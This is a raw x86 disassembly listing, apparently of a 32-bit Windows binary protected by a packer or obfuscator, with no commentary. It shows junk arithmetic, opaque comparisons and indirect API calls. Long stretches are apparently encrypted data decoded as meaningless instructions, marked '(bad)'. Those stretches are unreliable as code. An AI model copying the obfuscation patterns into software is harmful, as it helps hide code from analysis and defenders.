  417c90:	push   DWORD PTR [esp+0x14]
  417c94:	call   0x411c08
  417c99:	mov    eax,DWORD PTR [esp+0xc]
  417c9d:	mov    ecx,DWORD PTR [esp+0xc]
  417ca1:	xor    DWORD PTR ds:0x4283fd,ecx
  417ca7:	mov    eax,DWORD PTR [eax]
  417ca9:	mov    ecx,DWORD PTR [ecx]
  417cab:	cmp    DWORD PTR ds:0x42848d,0x0
  417cb2:	mov    DWORD PTR ds:0x428521,0x49de
  417cbc:	mov    ebx,0x75ce
  417cc1:	not    edx
  417cc3:	mov    edx,0x562b
  417cc8:	jmp    0x417d30
  417ccd:	mov    DWORD PTR ds:0x4283fd,0x3679
  417cd7:	cmp    DWORD PTR ds:0x42848d,0x0
  417cde:	jle    0x417d16
  417ce4:	push   0x3f3a
  417ce9:	push   0x4284a5
  417cee:	push   DWORD PTR [ebp-0x20]
  417cf1:	push   DWORD PTR [ebp-0x14]
  417cf4:	call   DWORD PTR ds:0x42e284
  417cfa:	xor    edx,DWORD PTR ds:0x4284fd
  417d00:	and    DWORD PTR ds:0x42830d,0x535f
  417d0a:	mov    ebx,DWORD PTR ds:0x4282ed
  417d10:	and    DWORD PTR ds:0x4282dd,ebx
  417d16:	adc    ebx,ebx
  417d18:	neg    DWORD PTR ds:0x4283d1
  417d1e:	mov    edx,DWORD PTR ds:0x428445
  417d24:	mov    ebx,DWORD PTR ds:0x4284c1
  417d2a:	sub    ebx,edx
  417d2c:	imul   edx,DWORD PTR [edx+ebx*1]
  417d30:	shr    eax,0x1e
  417d33:	shl    ecx,0x2
  417d36:	cmp    DWORD PTR ds:0x4282e5,0x0
  417d3d:	mov    edx,0x88a
  417d42:	mov    DWORD PTR ds:0x42847d,0x5f12
  417d4c:	mov    DWORD PTR ds:0x428309,0x1abe
  417d56:	jmp    0x417da7
  417d5b:	mov    DWORD PTR ds:0x4283fd,edi
  417d61:	cmp    DWORD PTR ds:0x4282e5,0x0
  417d68:	ja     0x417d87
  417d6e:	push   DWORD PTR [ebp-0x20]
  417d71:	push   0x428301
  417d76:	push   DWORD PTR [ebp-0x18]
  417d79:	call   DWORD PTR ds:0x42e0fc
  417d7f:	sbb    ebx,ebx
  417d81:	or     DWORD PTR ds:0x428415,ecx
  417d87:	mov    DWORD PTR ds:0x4284a1,0x1aca
  417d91:	and    ebx,DWORD PTR ds:0x428519
  417d97:	adc    DWORD PTR ds:0x4284a9,0x890
  417da1:	xor    DWORD PTR ds:0x428315,edi
  417da7:	or     eax,ecx
  417da9:	and    ecx,0x4e3
  417daf:	mov    ecx,DWORD PTR [esp+0xc]
  417db3:	xor    eax,0xa5069bae
  417db8:	and    ebx,ebx
  417dba:	mov    DWORD PTR [ecx],eax
  417dbc:	lea    eax,[esp+0x40]
  417dc0:	sbb    ecx,DWORD PTR ds:0x4282dd
  417dc6:	mov    DWORD PTR [esp+0x98],eax
  417dcd:	jmp    0x41802a
  417dd2:	or     eax,0xb0eeb0bf
  417dd7:	scas   al,BYTE PTR es:[edi]
  417dd8:	(bad)  
  417dd9:	and    BYTE PTR [ebx],al
  417ddb:	inc    esp
  417ddc:	lods   al,BYTE PTR ds:[esi]
  417ddd:	jecxz  0x417e2d
  417ddf:	push   edi
  417de0:	lds    esp,FWORD PTR [ebx+ebp*8+0x35bec0e6]
  417de7:	ret    0xbebe
  417dea:	xlat   BYTE PTR ds:[ebx]
  417deb:	push   cs
  417dec:	in     al,dx
  417ded:	xchg   ebx,eax
  417dee:	xor    al,BYTE PTR [edx+0x27]
  417df1:	sub    al,0xe5
  417df3:	sub    eax,0x50cfae3
  417df8:	sbb    ebx,DWORD PTR [ecx]
  417dfa:	sub    ah,BYTE PTR [ecx+edx*1+0x2d8b3adf]
  417e01:	ins    DWORD PTR es:[edi],dx
  417e02:	jb     0x417da9
  417e04:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417e05:	push   edx
  417e06:	inc    edx
  417e07:	and    DWORD PTR [edx],ebx
  417e09:	jbe    0x417daa
  417e0b:	jns    0x417dcc
  417e0d:	out    0xe2,al
  417e0f:	(bad)  
  417e10:	jnp    0x417db9
  417e12:	mov    ds:0xad1fb33f,al
  417e17:	adc    esp,DWORD PTR [edi-0x6c]
  417e1a:	add    BYTE PTR es:[eax-0x3c],0xc7
  417e1f:	mov    bh,0x77
  417e21:	repz popf 
  417e23:	into   
  417e24:	imul   ebp,DWORD PTR [ebp-0x2df253da],0xffffff97
  417e2b:	jmp    0x33ff:0x527e3907
  417e32:	xor    DWORD PTR [edx+eax*4+0x31219fd4],edi
  417e39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417e3a:	jle    0x417dc1
  417e3c:	fs mov esi,0xd73b9a57
  417e42:	jecxz  0x417de8
  417e44:	out    0x51,al
  417e46:	sub    eax,0x156b9907
  417e4b:	cli    
  417e4c:	popa   
  417e4d:	jns    0x417e5a
  417e4f:	imul   edi,DWORD PTR [ebp-0x21],0x8d26f7a1
  417e56:	inc    eax
  417e57:	jnp    0x417dde
  417e59:	scas   al,BYTE PTR es:[edi]
  417e5a:	sbb    BYTE PTR [ebx-0x777bdfde],dl
  417e60:	cs pop edx
  417e62:	lods   eax,DWORD PTR ds:[esi]
  417e63:	pop    ds
  417e64:	pop    eax
  417e65:	push   edi
  417e66:	pop    edx
  417e67:	sub    DWORD PTR [ecx-0x1f8c81eb],ebp
  417e6d:	push   es
  417e6e:	mov    ah,BYTE PTR [ecx+0x4b02d48]
  417e74:	out    dx,al
  417e75:	mov    ecx,0xfeb6529
  417e7a:	leave  
  417e7b:	les    ebx,FWORD PTR [ecx-0x32694c59]
  417e81:	mov    BYTE PTR [ebx+0x5bc82e1],dh
  417e87:	push   0x1f
  417e89:	(bad)  
  417e8a:	in     eax,0xfb
  417e8c:	mov    ds:0x19f39984,al
  417e91:	adc    ah,BYTE PTR [ebp+0x6d]
  417e94:	retf   
  417e95:	mov    ebp,0xebd2997d
  417e9a:	cmp    ax,WORD PTR [ebx]
  417e9d:	ja     0x417e4e
  417e9f:	sti    
  417ea0:	cmp    al,0x2e
  417ea2:	xchg   ebx,eax
  417ea3:	and    ebx,DWORD PTR [edi-0x17]
  417ea6:	imul   edi,DWORD PTR [ebx],0x3f
  417ea9:	les    ebp,FWORD PTR [ebx+0x55d06dc7]
  417eaf:	sbb    esp,DWORD PTR [eax]
  417eb1:	ins    DWORD PTR es:[edi],dx
  417eb2:	arpl   WORD PTR [eax],sp
  417eb4:	mov    dh,0xb
  417eb6:	ins    DWORD PTR es:[edi],dx
  417eb7:	call   0x91da2f92
  417ebc:	(bad)  
  417ebd:	push   esi
  417ebe:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417ebf:	push   ss
  417ec0:	pop    ds
  417ec1:	stc    
  417ec2:	mov    ecx,0x3c7f52a
  417ec7:	call   0xcc3a:0x4d99d89d
  417ece:	sub    al,0x47
  417ed0:	inc    edx
  417ed1:	hlt    
  417ed2:	xor    DWORD PTR [eax+ebx*1],esp
  417ed5:	test   eax,0x9d0b165e
  417eda:	mov    ds:0x70e02fc9,eax
  417edf:	bound  ecx,QWORD PTR [edi]
  417ee1:	cs xchg ebx,eax
  417ee3:	jnp    0x417e82
  417ee5:	xchg   BYTE PTR [ebp+0x140d0f74],ah
  417eeb:	xor    ecx,ecx
  417eed:	dec    edi
  417eee:	shl    BYTE PTR [edi+eiz*8+0x2803b1cd],1
  417ef5:	popa   
  417ef6:	in     al,dx
  417ef7:	call   0x7159:0x22e67c9a
  417efe:	mov    ecx,0xa33619e2
  417f03:	rep stos DWORD PTR es:[edi],eax
  417f05:	jp     0x417f16
  417f07:	pop    ebx
  417f08:	sbb    esi,edx
  417f0a:	xor    BYTE PTR ds:0xe5d54c24,ch
  417f10:	mov    ecx,0x32027ba
  417f15:	not    edx
  417f17:	jmp    0xdb95:0xe27f2c39
  417f1e:	(bad)  
  417f1f:	psubd  mm2,QWORD PTR [ebp+0x3e]
  417f23:	loop   0x417eb7
  417f25:	pop    esi
  417f26:	out    dx,eax
  417f27:	pusha  
  417f28:	jmp    0x417f87
  417f2a:	jbe    0x417f81
  417f2c:	ds dec esp
  417f2e:	cs call 0xb9d4:0x6cd339f3
  417f36:	pop    ds
  417f37:	adc    al,0x1
  417f39:	inc    ebx
  417f3a:	dec    edx
  417f3b:	or     DWORD PTR [ebx],0xffffff90
  417f3e:	enter  0x6ed3,0x90
  417f42:	mov    ds:0xf9bdab6a,eax
  417f47:	cmp    ebx,ebx
  417f49:	repz mov WORD PTR [ecx+0x166c118],ss
  417f50:	sti    
  417f51:	ret    0x37f6
  417f54:	add    DWORD PTR [ebx],ecx
  417f56:	xor    eax,DWORD PTR [ecx+0x3f]
  417f59:	nop
  417f5a:	fs into 
  417f5c:	loope  0x417f80
  417f5e:	adc    ebx,DWORD PTR [eax+0x6d]
  417f61:	pushf  
  417f62:	or     dl,bl
  417f64:	(bad)  
  417f65:	fild   WORD PTR [ebx]
  417f67:	push   ebp
  417f68:	xchg   ebp,eax
  417f69:	add    DWORD PTR [edi+0x18282f87],0x9ec885b8
  417f73:	lahf   
  417f74:	shl    DWORD PTR [ecx],0xa6
  417f77:	sub    edx,DWORD PTR [edi]
  417f79:	add    DWORD PTR [esp+ebp*1],esp
  417f7c:	adc    bl,BYTE PTR [edx]
  417f7e:	xchg   ebx,eax
  417f7f:	sbb    ebx,edi
  417f81:	es arpl bx,cx
  417f84:	mov    ds:0xdd5f89f6,al
  417f89:	(bad)  
  417f8a:	inc    esi
  417f8b:	cmp    ch,BYTE PTR [edi-0x4e613d01]
  417f91:	(bad)  
  417f92:	mul    BYTE PTR [edx]
  417f94:	cdq    
  417f95:	sbb    ecx,DWORD PTR [ebx]
  417f97:	mov    dh,0xe6
  417f99:	add    sp,di
  417f9c:	out    dx,eax
  417f9d:	out    0x6c,al
  417f9f:	mov    edi,DWORD PTR [ebx+0x249789bf]
  417fa5:	outs   dx,DWORD PTR ds:[esi]
  417fa6:	(bad)  
  417fa7:	loope  0x417f70
  417fa9:	aam    0x9a
  417fab:	fs mov edi,0x1f81ab3a
  417fb1:	xlat   BYTE PTR ds:[ebx]
  417fb2:	mov    ebx,0x7d2bdd11
  417fb7:	adc    eax,0xf1fc31cf
  417fbc:	xor    al,0x87
  417fbe:	dec    eax
  417fbf:	dec    esp
  417fc0:	(bad)  
  417fc3:	stc    
  417fc4:	leave  
  417fc5:	push   ecx
  417fc6:	(bad)  
  417fc7:	es ins DWORD PTR es:[edi],dx
  417fc9:	push   eax
  417fca:	stos   BYTE PTR es:[edi],al
  417fcb:	xchg   BYTE PTR [ecx+eiz*4],bh
  417fce:	pop    esp
  417fcf:	dec    eax
  417fd0:	cmp    ebp,ebx
  417fd2:	or     ebx,eax
  417fd4:	popa   
  417fd5:	push   ecx
  417fd6:	or     bh,BYTE PTR [ebx-0x35e680a5]
  417fdc:	jmp    0xf999:0x2ebb2221
  417fe3:	mov    cl,0xfc
  417fe5:	adc    BYTE PTR [ebp-0x48],cl
  417fe8:	sar    BYTE PTR [edi],0x14
  417feb:	(bad)  
  417fed:	push   edx
  417fee:	dec    esi
  417fef:	cmp    ebx,DWORD PTR [edx+eax*4-0x3f]
  417ff3:	and    dl,BYTE PTR [ebx+ebx*4-0x1d844e2c]
  417ffa:	leave  
  417ffb:	pop    ss
  417ffc:	scas   ax,WORD PTR es:[edi]
  417ffe:	inc    ebp
  417fff:	push   edx
  418000:	jle    0x418049
  418002:	aas    
  418003:	das    
  418004:	cld    
  418005:	sub    DWORD PTR [eax],0xffffffd0
  418008:	popf   
  418009:	add    DWORD PTR [ebp+0x64],edi
  41800c:	push   ebx
  41800d:	retf   
  41800e:	scas   eax,DWORD PTR es:[edi]
  41800f:	dec    ecx
  418010:	jp     0x418067
  418012:	push   edx
  418013:	test   DWORD PTR [esi],eax
  418015:	int3   
  418016:	iret   
  418017:	xchg   BYTE PTR [eax],bh
  418019:	mov    bl,dl
  41801b:	xchg   BYTE PTR [ecx+0x62],ch
  41801e:	js     0x41805b
  418020:	push   es
  418021:	add    al,0xc6
  418023:	sbb    al,0x43
  418025:	push   eax
  418026:	push   ebp
  418027:	mov    esp,DWORD PTR [esi]
  418029:	push   eax
  41802a:	lea    eax,[esp+0x98]
  418031:	cmp    DWORD PTR ds:0x42840d,0x0
  418038:	mov    DWORD PTR ds:0x4282e5,0x1551
  418042:	mov    DWORD PTR ds:0x4284f5,0x780e
  41804c:	mov    DWORD PTR ds:0x4282e9,0x4b14
  418056:	jmp    0x418149
  41805b:	mov    DWORD PTR ds:0x4282f1,edx
  418061:	mov    DWORD PTR ds:0x4282ed,0x4140
  41806b:	cmp    DWORD PTR ds:0x42840d,0x0
  418072:	je     0x4180ae
  418078:	push   0x4281a1
  41807d:	push   0x428107
  418082:	call   DWORD PTR ds:0x42e288
  418088:	mov    ecx,DWORD PTR ds:0x428445
  41808e:	xor    ebx,ebx
  418090:	or     ebx,DWORD PTR ds:0x4284ed
  418096:	sub    ebx,ecx
  418098:	and    ecx,DWORD PTR [ecx+ebx*1]
  41809b:	mov    ecx,DWORD PTR ds:0x4283b5
  4180a1:	adc    DWORD PTR ds:0x4284b1,ecx
  4180a7:	inc    edx
  4180a8:	and    DWORD PTR ds:0x4283fd,edi
  4180ae:	adc    DWORD PTR ds:0x428489,edx
  4180b4:	xor    ebx,ebx
  4180b6:	or     ebx,DWORD PTR ds:0x428361
  4180bc:	mov    ebx,DWORD PTR [ebx]
  4180be:	sub    DWORD PTR ds:0x4283d5,ebx
  4180c4:	xor    DWORD PTR ds:0x428499,0x2cb6
  4180ce:	cmp    DWORD PTR ds:0x428415,0x0
  4180d5:	mov    DWORD PTR ds:0x4283fd,edx
  4180db:	mov    edx,DWORD PTR ds:0x42848d
  4180e1:	jmp    0x418149
  4180e6:	mov    DWORD PTR ds:0x42852d,ebx
  4180ec:	cmp    DWORD PTR ds:0x428415,0x0
  4180f3:	jg     0x41811b
  4180f9:	push   0x4283c1
  4180fe:	push   0x1e32
  418103:	call   DWORD PTR ds:0x42e28c
  418109:	or     DWORD PTR ds:0x428319,ecx
  41810f:	adc    DWORD PTR ds:0x4284f9,0x3832
  418119:	not    ecx
  41811b:	sub    edx,DWORD PTR ds:0x428425
  418121:	mov    edx,DWORD PTR ds:0x428339
  418127:	mov    ebx,DWORD PTR ds:0x4284c1
  41812d:	sub    ebx,edx
  41812f:	sub    edx,DWORD PTR [edx+ebx*1]
  418132:	or     ecx,DWORD PTR ds:0x4284f9
  418138:	mov    ebx,DWORD PTR ds:0x428369
  41813e:	mov    ecx,DWORD PTR ds:0x428569
  418144:	sub    ecx,ebx
  418146:	or     ebx,DWORD PTR [ebx+ecx*1]
  418149:	mov    DWORD PTR [esp+0x9c],eax
  418150:	and    DWORD PTR ds:0x428401,ebx
  418156:	mov    eax,DWORD PTR [esp+0x40]
  41815a:	sub    DWORD PTR [esp+0x40],eax
  41815e:	mov    edx,DWORD PTR ds:0x42852d
  418164:	sub    DWORD PTR ds:0x42840d,edx
  41816a:	lea    eax,[ebp+0x4]
  41816d:	cmp    DWORD PTR ds:0x428525,0x0
  418174:	mov    DWORD PTR ds:0x42848d,0x1e13
  41817e:	mov    ecx,0x65ab
  418183:	jmp    0x4181f4
  418188:	mov    ecx,0x6be4
  41818d:	mov    edx,0x487
  418192:	cmp    DWORD PTR ds:0x428525,0x0
  418199:	jge    0x4181bd
  41819f:	push   DWORD PTR [ebp-0x1c]
  4181a2:	push   0x28cd
  4181a7:	call   DWORD PTR ds:0x42e100
  4181ad:	sub    DWORD PTR ds:0x428425,ebx
  4181b3:	add    DWORD PTR ds:0x428529,0x4283f1
  4181bd:	mov    ebx,DWORD PTR ds:0x428511
  4181c3:	sbb    ebx,DWORD PTR ds:0x4283b9
  4181c9:	mov    DWORD PTR ds:0x428511,ebx
  4181cf:	mov    edx,DWORD PTR ds:0x42835d
  4181d5:	mov    ebx,DWORD PTR ds:0x4284d9
  4181db:	sub    edx,ebx
  4181dd:	add    edx,DWORD PTR [edx+ebx*1]
  4181e0:	mov    ebx,DWORD PTR ds:0x4282dd
  4181e6:	and    ebx,DWORD PTR ds:0x4283d9
  4181ec:	mov    DWORD PTR ds:0x4282dd,ebx
  4181f2:	not    edx
  4181f4:	xor    DWORD PTR [esp+0x40],eax
  4181f8:	mov    DWORD PTR [esp+0x30],0x5b3d
  418200:	cmp    DWORD PTR ds:0x42850d,0x0
  418207:	mov    DWORD PTR ds:0x428495,0x564a
  418211:	mov    DWORD PTR ds:0x428415,ecx
  418217:	jmp    0x4184c9
  41821c:	mov    eax,0x378f
  418221:	cmp    DWORD PTR ds:0x42850d,0x0
  418228:	ja     0x41824a
  41822e:	push   0x77e8
  418233:	push   0x361b
  418238:	call   DWORD PTR ds:0x42e104
  41823e:	and    ebx,0x2889
  418244:	not    ebx
  418246:	or     edx,ecx
  418248:	sbb    ecx,ecx
  41824a:	xor    ecx,ecx
  41824c:	xor    ecx,DWORD PTR ds:0x428409
  418252:	adc    DWORD PTR ds:0x42851d,ecx
  418258:	xor    DWORD PTR ds:0x4282f5,0x4309
  418262:	sub    DWORD PTR ds:0x428325,0x3ee2
  41826c:	jmp    0x4184c9
  418271:	inc    esp
  418272:	inc    edx
  418273:	in     al,dx
  418274:	xor    ah,ch
  418276:	mov    eax,0x8987b29c
  41827b:	test   bh,cl
  41827d:	mov    WORD PTR [ebx+eax*8-0x3f159b31],cs
  418284:	mov    esi,0xbebec235
  418289:	sbb    eax,0x1bc3d0be
  41828e:	lock inc edx
  418290:	inc    edi
  418291:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418292:	lahf   
  418293:	inc    ebp
  418294:	cmp    al,0x6
  418296:	push   es
  418297:	aaa    
  418298:	cli    
  418299:	and    DWORD PTR [esi+ebx*8-0x48],esp
  41829d:	pop    ds
  41829e:	sahf   
  41829f:	ins    BYTE PTR es:[edi],dx
  4182a0:	retf   
  4182a1:	push   edx
  4182a2:	cmc    
  4182a3:	or     eax,0x5edc10bd
  4182a8:	fist   WORD PTR [edi+0x275ef1c6]
  4182ae:	xchg   esi,edx
  4182b0:	or     esi,eax
  4182b2:	in     eax,0x8
  4182b4:	mov    ebp,0xbf7c20d5
  4182b9:	loopne 0x4182a3
  4182bb:	lahf   
  4182bc:	enter  0xce64,0x20
  4182c0:	fcomp  QWORD PTR [edx-0x156d680d]
  4182c6:	es out 0x9a,al
  4182c9:	inc    ebp
  4182ca:	cmc    
  4182cb:	or     DWORD PTR [ebp+0x7a],0xdadc0c44
  4182d2:	mov    eax,ds:0xa003c342
  4182d7:	or     ebp,DWORD PTR [edi-0x6a]
  4182da:	in     al,0x99
  4182dc:	xchg   edi,eax
  4182dd:	and    al,0x36
  4182df:	adc    al,0xbb
  4182e1:	es adc al,0x18
  4182e4:	mov    esp,0x699928d9
  4182e9:	xor    bl,BYTE PTR [ebx-0x8308fa5]
  4182ef:	lods   eax,DWORD PTR ds:[esi]
  4182f0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4182f1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4182f2:	xor    DWORD PTR [ebx-0x19],0xffffffb4
  4182f6:	inc    edi
  4182f7:	sbb    eax,0x16f1e214
  4182fc:	pop    ecx
  4182fd:	mov    bh,0xd7
  4182ff:	hlt    
  418300:	push   es
  418301:	and    eax,0xd2f0f8ba
  418306:	aad    0x53
  418308:	add    BYTE PTR [ebp-0x2dc01587],bh
  41830e:	inc    esi
  41830f:	add    al,0x8d
  418311:	or     DWORD PTR gs:[ecx+0x7d],edi
  418315:	push   esp
  418316:	outs   dx,BYTE PTR ds:[esi]
  418317:	test   edi,ebp
  418319:	sti    
  41831a:	jno    0x418390
  41831c:	test   DWORD PTR [edx+0x6c1d228],0x464d900d
  418326:	loopne 0x41835f
  418328:	outs   dx,BYTE PTR ds:[esi]
  418329:	test   esp,edi
  41832b:	lea    esi,[ebp-0x55]
  41832e:	(bad)  [edx-0x12]
  418331:	inc    esp
  418332:	sbb    al,0xac
  418334:	mov    dl,0x86
  418336:	xchg   ebx,eax
  418337:	and    eax,0x2789ceb2
  41833c:	inc    edi
  41833d:	pop    ebp
  41833e:	inc    ebp
  41833f:	inc    edx
  418340:	mov    ecx,0xa2c26c3f
  418345:	mov    DWORD PTR [ebp-0x48170520],0x26a3ebe0
  41834f:	or     eax,0xae3621d5
  418354:	xor    esi,DWORD PTR [eax-0x7b960070]
  41835a:	lods   al,BYTE PTR ds:[esi]
  41835b:	les    esp,FWORD PTR [ebp*4+0x500be272]
  418362:	mov    BYTE PTR [esi],0x1b
  418365:	repz dec eax
  418367:	ss sub al,0x5d
  41836a:	jmp    0x3330daff
  41836f:	dec    edi
  418370:	sub    eax,0xbdfe4e54
  418375:	cli    
  418376:	mov    eax,ds:0xf8c93fac
  41837b:	iret   
  41837c:	mov    BYTE PTR [esi+edi*4],ah
  41837f:	and    dl,BYTE PTR [eax]
  418381:	ja     0x418394
  418383:	lahf   
  418384:	inc    esi
  418385:	pop    ebx
  418386:	push   0xffffffb5
  418388:	es fs dec ebx
  41838b:	jns    0x4183eb
  41838d:	push   0xffffffc0
  41838f:	push   ebp
  418390:	shl    DWORD PTR [eax+0x4b8baca0],0xe8
  418397:	rcr    BYTE PTR [esi],0xba
  41839a:	pop    ecx
  41839b:	mov    BYTE PTR [ecx],al
  41839d:	mov    esi,0xd587ed09
  4183a2:	or     al,0xf6
  4183a4:	leave  
  4183a5:	lahf   
  4183a6:	mov    al,ds:0x8d74e7e4
  4183ab:	push   0xec6e93f2
  4183b0:	pop    edi
  4183b1:	scas   al,BYTE PTR es:[edi]
  4183b2:	(bad)  
  4183b3:	jmp    0x5c863fcf
  4183b8:	mov    BYTE PTR [ebx+0x5e7e5d8f],ch
  4183be:	popf   
  4183bf:	push   0x6a70f790
  4183c4:	inc    esi
  4183c5:	cmc    
  4183c6:	sub    dl,bl
  4183c8:	inc    edx
  4183c9:	imul   ebx,DWORD PTR [esi+0x16],0xffffff99
  4183cd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4183ce:	and    esi,esi
  4183d0:	cmp    ebp,DWORD PTR [edx-0x5f3c0b15]
  4183d6:	jae    0x4183a4
  4183d8:	cs retf 0xd8f5
  4183dc:	enter  0x6b1b,0xc1
  4183e0:	or     BYTE PTR [ebx+0x3e],dh
  4183e3:	push   esi
  4183e4:	push   0xa65c1059
  4183e9:	adc    DWORD PTR [esi],edx
  4183eb:	ret    
  4183ec:	je     0x41839d
  4183ee:	xor    edx,ebp
  4183f0:	in     eax,0x51
  4183f2:	and    ch,BYTE PTR [edx]
  4183f4:	addr16 loop 0x4183f7
  4183f7:	ret    0xb23d
  4183fa:	xor    BYTE PTR [ecx+0x60],al
  4183fd:	mov    WORD PTR ds:0x6355369a,ds
  418403:	sar    BYTE PTR [si-0x68],1
  418407:	sbb    BYTE PTR [ebx+0x59],0xe5
  41840b:	push   cs
  41840c:	pop    esp
  41840d:	icebp  
  41840e:	rol    BYTE PTR [ebp+0x43454fd3],1
  418414:	icebp  
  418415:	rol    DWORD PTR [ebp+0x67],cl
  418418:	(bad)  
  418419:	repnz sbb ah,BYTE PTR [edi+0x22]
  41841d:	jl     0x41842f
  41841f:	mov    bl,0x14
  418421:	mov    edi,0x7ee23043
  418426:	fdiv   DWORD PTR [edx-0x50158239]
  41842c:	jp     0x4183ce
  41842e:	push   es
  41842f:	js     0x418471
  418431:	lods   al,BYTE PTR ds:[esi]
  418432:	gs clc 
  418434:	mov    WORD PTR [ecx-0x5fc3237a],ds
  41843a:	in     eax,dx
  41843b:	inc    ebp
  41843c:	push   0xdb1089f9
  418441:	sbb    eax,0xd558c6a1
  418446:	call   0x7295d89b
  41844b:	in     eax,dx
  41844c:	aaa    
  41844d:	dec    edx
  41844e:	retf   0xf808
  418451:	(bad)  
  418452:	mov    dl,0xd4
  418454:	fisubr DWORD PTR [ebx]
  418456:	aas    
  418457:	js     0x418412
  418459:	cli    
  41845a:	test   eax,0x9fe691b2
  41845f:	and    BYTE PTR [edi-0x24],dl
  418462:	je     0x41845e
  418464:	push   edx
  418465:	mov    ds:0xa37b3746,al
  41846a:	adc    esp,DWORD PTR [eax]
  41846c:	mov    ecx,0xbbfa9698
  418471:	popa   
  418472:	pop    esi
  418473:	cmp    DWORD PTR [esi-0x7c],esp
  418476:	xchg   ebp,eax
  418477:	inc    edi
  418478:	pop    ecx
  418479:	mov    eax,0x1af2fe16
  41847e:	xchg   edi,eax
  41847f:	call   0x31aefe74
  418484:	div    DWORD PTR [eax-0x6974727c]
  41848a:	inc    DWORD PTR [edi+esi*4+0x71e1fd3c]
  418491:	mov    al,0xb8
  418493:	sbb    bl,BYTE PTR [ebp+0x5cc7c121]
  418499:	ss clc 
  41849b:	xor    BYTE PTR [eax+eax*4-0x46ef6a5e],dl
  4184a2:	adc    eax,DWORD PTR [ebp-0x56]
  4184a5:	pop    ebx
  4184a6:	repnz sub ebp,DWORD PTR [edi-0x24]
  4184aa:	mov    ds:0x8f3aa21c,eax
  4184af:	or     eax,0xff94cf9a
  4184b4:	jb     0x4184bc
  4184b6:	(bad)  
  4184b7:	adc    dl,BYTE PTR [esi+0x5433261e]
  4184bd:	aas    
  4184be:	add    al,cl
  4184c0:	test   DWORD PTR [eax+esi*2-0x6bf80f73],edi
  4184c7:	sti    
  4184c8:	mov    cl,0xc7
  4184ca:	inc    esp
  4184cb:	and    al,0x34
  4184cd:	inc    ebp
  4184ce:	inc    esp
  4184cf:	add    BYTE PTR [eax],al
  4184d1:	mov    DWORD PTR [esp+0x10],0xa52
  4184d9:	mov    DWORD PTR [esp+0x14],0x1c69
  4184e1:	mov    eax,DWORD PTR [esp+0x10]
  4184e5:	mov    ecx,DWORD PTR [esp+0x14]
  4184e9:	mov    edx,DWORD PTR [esp+0x30]
  4184ed:	mov    ebx,DWORD PTR [esp+0x34]
  4184f1:	add    eax,0xffffd1a5
  4184f6:	adc    ecx,0xffffedf0
  4184fc:	xor    eax,edx
  4184fe:	xor    ecx,ebx
  418500:	and    eax,0x325d
  418505:	mov    DWORD PTR [esp+0x50],eax
  418509:	and    ecx,0x3544
  41850f:	mov    DWORD PTR [esp+0x54],ecx
  418513:	mov    DWORD PTR [esp+0x48],0x1704
  41851b:	mov    DWORD PTR [esp+0x4c],0x4a75
  418523:	mov    DWORD PTR [esp+0x30],0x985
  41852b:	mov    DWORD PTR [esp+0x34],0x341
  418533:	mov    DWORD PTR [esp+0x10],0x5aa9
  41853b:	mov    DWORD PTR [esp+0x14],0x221a
  418543:	mov    eax,DWORD PTR [esp+0x10]
  418547:	mov    ecx,DWORD PTR [esp+0x14]
  41854b:	mov    edx,DWORD PTR [esp+0x30]
  41854f:	mov    ebx,DWORD PTR [esp+0x34]
  418553:	push   ebx
  418554:	push   edx
  418555:	or     ecx,0xc32
  41855b:	or     eax,0x502a
  418560:	push   ecx
  418561:	push   eax
  418562:	call   0x41594e
  418567:	mov    ecx,DWORD PTR [esp+0x48]
  41856b:	mov    ebx,DWORD PTR [esp+0x4c]
  41856f:	sub    eax,ecx
  418571:	mov    ecx,DWORD PTR [esp+0x50]
  418575:	sbb    edx,ebx
  418577:	mov    ebx,DWORD PTR [esp+0x54]
  41857b:	cmp    ecx,eax
  41857d:	jne    0x41858b
  418583:	cmp    ebx,edx
  418585:	je     0x41a937
  41858b:	mov    DWORD PTR [esp+0x30],0x71ba
  418593:	mov    DWORD PTR [esp+0x34],0x5f78
  41859b:	mov    DWORD PTR [esp+0x10],0x7b9c
  4185a3:	mov    DWORD PTR [esp+0x14],0x5622
  4185ab:	mov    eax,DWORD PTR [esp+0x10]
  4185af:	mov    ecx,DWORD PTR [esp+0x14]
  4185b3:	mov    edx,DWORD PTR [esp+0x30]
  4185b7:	mov    ebx,DWORD PTR [esp+0x34]
  4185bb:	jmp    0x418818
  4185c0:	inc    edi
  4185c1:	pop    ebp
  4185c2:	sti    
  4185c3:	daa    
  4185c4:	sti    
  4185c5:	mov    ebx,0x271b9d9b
  4185ca:	mov    esp,0xe535dfa4
  4185cf:	jecxz  0x4185ad
  4185d1:	out    dx,eax
  4185d2:	sar    BYTE PTR [esi-0x41413dcb],0x8e
  4185d9:	xchg   edi,eax
  4185da:	imul   edx,DWORD PTR [ebp+eiz*1+0x10191e52],0x2c9a02f2
  4185e5:	pop    esp
  4185e6:	mov    al,ds:0x818f476
  4185eb:	xchg   esp,eax
  4185ec:	ret    0x8094
  4185ef:	(bad)  
  4185f0:	adc    al,0x8b
  4185f2:	push   es
  4185f3:	ja     0x418636
  4185f5:	scas   eax,DWORD PTR es:[edi]
  4185f6:	(bad)  
  4185f7:	out    dx,eax
  4185f8:	xchg   ebp,eax
  4185f9:	or     BYTE PTR [eax],bl
  4185fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4185fc:	xor    ecx,ecx
  4185fe:	in     al,0x31
  418600:	xor    eax,0xd3bebfc4
  418605:	or     eax,0xf7b964c
  41860a:	loope  0x4185d4
  41860c:	xor    edx,DWORD PTR [edx-0x31f25c90]
  418612:	bound  esi,QWORD PTR [edi+ecx*2+0x12]
  418616:	sub    BYTE PTR [edi-0x35],bh
  418619:	fdiv   DWORD PTR [edi+0x245815bd]
  41861f:	test   al,0x59
  418621:	sti    
  418622:	in     al,0x18
  418624:	lahf   
  418625:	or     dl,BYTE PTR [ebx-0x1f]
  418628:	inc    edi
  418629:	clc    
  41862a:	mov    eax,0x2d5c7624
  41862f:	inc    eax
  418630:	or     eax,0x8124c83b
  418635:	pusha  
  418636:	push   ecx
  418637:	or     eax,0x1b2fe42e
  41863c:	xchg   edi,eax
  41863d:	and    esp,DWORD PTR [esi]
